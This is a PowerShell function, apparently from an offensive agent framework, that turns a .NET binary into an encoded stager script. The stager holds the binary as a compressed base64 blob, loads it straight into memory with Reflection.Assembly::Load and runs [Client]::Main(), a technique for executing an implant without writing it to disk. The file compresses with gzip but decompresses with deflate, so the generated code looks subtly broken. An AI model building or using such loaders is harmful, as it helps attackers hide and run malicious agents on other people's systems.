function Get-CompressedAgent {

	[CmdletBinding()]
    Param(
    [String]$inFile,
    [String]$outFile
    )

    $byteArray = [System.IO.File]::ReadAllBytes($inFile)

    Write-Verbose "Get-CompressedByteArray"
    [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
    $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
    $gzipStream.Write( $byteArray, 0, $byteArray.Length )
    $gzipStream.Close()
    $output.Close()
    $tmp = $output.ToArray()

    $b64 = [System.Convert]::ToBase64String($tmp)

$final_output = @"
`$EncodedCompressedFile = @'
$b64
'@
`$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(`$EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
`$UncompressedFileBytes = New-Object Byte[]($byteArray.Length)
`$DeflatedStream.Read(`$UncompressedFileBytes, 0, $byteArray.Length) | Out-Null
[Reflection.Assembly]::Load(`$UncompressedFileBytes)
[Client]::Main()
"@

    [System.IO.File]::WriteAllText($outFile, $final_output)
}